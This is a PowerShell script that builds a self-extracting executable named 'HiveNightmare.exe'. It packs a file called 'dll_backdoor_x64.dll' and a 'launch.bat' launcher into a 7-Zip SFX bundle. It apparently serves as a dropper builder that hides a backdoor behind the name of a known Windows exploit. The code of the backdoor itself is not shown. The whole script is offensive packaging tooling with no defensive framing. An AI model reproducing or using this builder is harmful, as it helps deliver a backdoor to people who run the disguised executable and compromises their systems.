# Improved PowerShell script to create a self-extracting bundle

$7zExe = "7z.exe"
$7zSfx = "7z.sfx"
$config = "config.txt"
$payloadName = "payload.7z"
$outputExe = "HiveNightmare.exe"
$files = @("dll_backdoor_x64.dll", "launch.bat")

# Check for required tools and files
foreach ($f in @($7zExe, $7zSfx, $config) + $files) {
    if (-not (Test-Path $f)) {
        Write-Error "Missing required file: $f"
        exit 1
    }
}

# Create 7z archive
Write-Host "Creating archive: $payloadName"
& .\$7zExe a -t7z $payloadName $files | Write-Host

# Build SFX executable
Write-Host "Building self-extracting EXE: $outputExe"
cmd /c "copy /b $7zSfx + $config + $payloadName $outputExe" | Write-Host

if (Test-Path $outputExe) {
    Write-Host "✅ Created: $outputExe"
} else {
    Write-Error "❌ Failed to create: $outputExe"
}
